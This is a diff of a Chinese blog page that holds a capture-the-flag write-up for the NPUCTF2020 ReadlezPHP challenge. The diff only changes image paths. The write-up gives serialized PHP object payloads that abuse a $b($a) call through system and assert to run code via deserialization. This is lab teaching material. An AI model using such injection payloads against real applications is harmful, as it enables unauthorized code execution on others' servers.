@@ -57,30 +57,30 @@
         </div>
         <div class="content markdown">
             <h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>打开容器，发现页面还“挺干净的”</p>
-<h4 id="一-初步探索"><a href="#一-初步探索" class="headerlink" title="一.初步探索"></a>一.初步探索</h4><p>查看源码：<img src="/buuctf21.assets/image-20210801130051966.png" alt="image-20210801130051966"></p>
+<h4 id="一-初步探索"><a href="#一-初步探索" class="headerlink" title="一.初步探索"></a>一.初步探索</h4><p>查看源码：<img src="/2021/08/01/buuctf21/image-20210801130051966.png" alt="image-20210801130051966"></p>
 <p>可以看到他是通过定向一个文件来获取时间信息的</p>
-<p>访问一下这个文件：<img src="/buuctf21.assets/image-20210802182352571.png" alt="image-20210802182352571"></p>
+<p>访问一下这个文件：<img src="/2021/08/01/buuctf21/image-20210802182352571.png" alt="image-20210802182352571"></p>
 <h4 id="二-代码审计"><a href="#二-代码审计" class="headerlink" title="二.代码审计"></a>二.代码审计</h4><p>存在一个类<code>HelloPhp</code>，值得注意的是<code>$b($a)</code>，感觉可以构造$b=system，$a=ls，来达到rce</p>
-<p>构造序列化<img src="/buuctf21.assets/image-20210802184624977.png" alt="image-20210802184624977"></p>
+<p>构造序列化<img src="/2021/08/01/buuctf21/image-20210802184624977.png" alt="image-20210802184624977"></p>
 <p>payload：<code>?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;ls&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125;</code></p>
-<p><img src="/buuctf21.assets/image-20210802184805518.png" alt="image-20210802184805518"></p>
+<p><img src="/2021/08/01/buuctf21/image-20210802184805518.png" alt="image-20210802184805518"></p>
 <p>看来没有rec成功，看来是过滤了，看了wp学了一下别的姿势</p>
 <h4 id="三-预备知识"><a href="#三-预备知识" class="headerlink" title="三.预备知识"></a>三.预备知识</h4><p><strong>assert()函数：</strong></p>
 <p>判断一个表达式是否成立。返回<code>true or false</code>。</p>
-<p>当参数为字符串时，会被当作php代码执行。<img src="/buuctf21.assets/image-20210802195334316.png" alt="image-20210802195334316"></p>
+<p>当参数为字符串时，会被当作php代码执行。<img src="/2021/08/01/buuctf21/image-20210802195334316.png" alt="image-20210802195334316"></p>
 <p><strong>这里要注意<code>assert</code>与<code>eval</code>的区别</strong></p>
 <p><code>assert</code>把整个字符串参数当php代码执行；</p>
 <p><code>eval</code>把合法的php代码执行。</p>
 <p><strong>举两个例子：</strong></p>
-<p>assert(eval(‘echo 1;’));<img src="/buuctf21.assets/image-20210802194800152.png" alt="image-20210802194800152"></p>
+<p>assert(eval(‘echo 1;’));<img src="/2021/08/01/buuctf21/image-20210802194800152.png" alt="image-20210802194800152"></p>
 <p>直接传递普通代码是无法执行的，如：assert(‘echo 1;’);</p>
-<p><img src="/buuctf21.assets/image-20210802194904217.png" alt="image-20210802194904217"></p>
+<p><img src="/2021/08/01/buuctf21/image-20210802194904217.png" alt="image-20210802194904217"></p>
 <h4 id="四-思路构建"><a href="#四-思路构建" class="headerlink" title="四.思路构建"></a>四.思路构建</h4><p>我们构造：</p>
 <p>$a=phpinfo()；$b=assert</p>
-<p><img src="/buuctf21.assets/image-20210802195723615.png" alt="image-20210802195723615"></p>
+<p><img src="/2021/08/01/buuctf21/image-20210802195723615.png" alt="image-20210802195723615"></p>
 <p>payload：<code>?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></p>
 <p>然后Ctrl+f搜索flag</p>
-<p><img src="/buuctf21.assets/image-20210802195905704.png" alt="image-20210802195905704"></p>
+<p><img src="/2021/08/01/buuctf21/image-20210802195905704.png" alt="image-20210802195905704"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
